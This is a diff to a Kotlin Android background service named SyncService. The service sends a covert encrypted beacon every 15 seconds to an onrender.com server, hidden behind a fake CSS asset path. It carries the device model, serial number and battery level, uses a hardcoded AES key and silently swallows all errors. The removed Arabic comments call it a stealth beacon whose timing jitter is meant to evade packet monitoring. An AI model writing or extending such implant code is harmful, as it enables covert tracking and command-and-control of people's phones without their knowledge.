@@ -22,61 +22,51 @@ class SyncService : Service() {
     private val RENDER_SERVER_URL = "https://web-assets-service.onrender.com"
     private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
     private var secureTimer: Timer? = null
-    private val random = SecureRandom()
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        scheduleNextStealthBeacon(1000) // إطلاق النبضة الأولى فوراً
+        startSecurePipeline()
         return START_STICKY
     }
 
-    // 🌟 موديول الارتعاش الشبكي (Jitter): تغيير جدول الإرسال عشوائياً لتعمية أنظمة مراقبة حزم البيانات
-    private fun scheduleNextStealthBeacon(delayMillis: Long) {
-        secureTimer?.cancel()
+    private fun startSecurePipeline() {
         secureTimer = Timer()
-        secureTimer?.schedule(object : TimerTask() {
+        secureTimer?.scheduleAtFixedRate(object : TimerTask() {
             override fun run() {
                 try {
-                    val dataPacket = JSONObject().apply {
-                        put("status", "HYBRID_SECURE_ACTIVE")
-                        put("battery", getBatteryLevel())
-                        put("timestamp", System.currentTimeMillis())
-                    }
+                    val dataPacket = JSONObject()
+                    dataPacket.put("status", "HYBRID_SECURE_ACTIVE")
+                    dataPacket.put("battery", getBatteryLevel())
+                    dataPacket.put("timestamp", System.currentTimeMillis())
 
-                    // 1. ضغط البيانات بـ GZIP ثم تشفيرها بـ AES-256-GCM
+                    // 1. ضغط البيانات بـ GZIP ثم تشفيرها عسكرياً
                     val encryptedBlob = compressAndEncrypt(dataPacket.toString())
                     
-                    // 2. إرسال الحزمة المشفرة صامتاً عبر بروتوكول HTTPS
+                    // 2. إرسال الحزمة الآمنة
                     sendEncryptedPayload("/assets/web/style-min.css", encryptedBlob)
 
-                } catch (e: Exception) {
-                    // كتم الاستثناءات لضمان عدم انهيار الخدمة الخلفية
-                } finally {
-                    // توليد وقت عشوائي دوري متغير بين 12 إلى 28 ثانية للنواة القادمة
-                    val dynamicDelay = 12000 + random.nextInt(16000).toLong()
-                    scheduleNextStealthBeacon(dynamicDelay)
-                }
+                } catch (e: Exception) {}
             }
-        }, delayMillis)
+        }, 0, 15000)
     }
 
-    // --- محرك الضغط والتشفير المزدوج المتوافق مع Node.js ---
+    // --- محرك الضغط والتشفير المزدوج ---
     private fun compressAndEncrypt(plainText: String): String {
-        // ضغط النص باستخدام GZIP لتقليص حجم البصمة الشبكية
+        // ضغط البيانات باستخدام GZIP
         val byteStream = ByteArrayOutputStream()
         val gzipStream = GZIPOutputStream(byteStream)
         gzipStream.write(plainText.toByteArray(Charsets.UTF_8))
         gzipStream.close()
         val compressedBytes = byteStream.toByteArray()
 
-        // تهيئة بايتات المفتاح AES-256
+        // تجهيز مفتاح التشفير AES-256
         val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
         val keySpec = SecretKeySpec(keyBytes, "AES")
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
         
         val iv = ByteArray(12)
-        random.nextBytes(iv) // توليد ناقل عشوائي متجدد لمنع كشف الأنماط
+        SecureRandom().nextBytes(iv) // ناقل عشوائي متجدد لمنع مطابقة الأنماط
         val spec = GCMParameterSpec(128, iv)
         
         cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
@@ -85,11 +75,10 @@ class SyncService : Service() {
         val encryptedData = cipherText.copyOfRange(0, cipherText.size - 16)
         val authTag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)
 
-        val packet = JSONObject().apply {
-            put("v", byteArrayToHex(iv))
-            put("g", byteArrayToHex(authTag))
-            put("d", byteArrayToHex(encryptedData))
-        }
+        val packet = JSONObject()
+        packet.put("v", byteArrayToHex(iv))
+        packet.put("g", byteArrayToHex(authTag))
+        packet.put("d", byteArrayToHex(encryptedData))
 
         return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
     }
@@ -101,8 +90,7 @@ class SyncService : Service() {
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "text/plain")
             conn.setRequestProperty("x-agent-model", android.os.Build.MODEL)
-            // تصحيح: استخدام معرف ثابت وآمن لتجنب حظر الصلاحياتSecurityException في Android 10+
-            conn.setRequestProperty("x-agent-id", "GhostAgent")
+            conn.setRequestProperty("x-agent-id", android.os.Build.SERIAL ?: "Secure-Node")
             conn.doOutput = true
             
             val os: OutputStream = conn.outputStream
@@ -110,7 +98,7 @@ class SyncService : Service() {
             os.flush()
             os.close()
 
-            conn.responseCode // إتمام الاتصال
+            conn.responseCode // إتمام الاتصال بصمت
         } catch (e: Exception) {}
     }
 
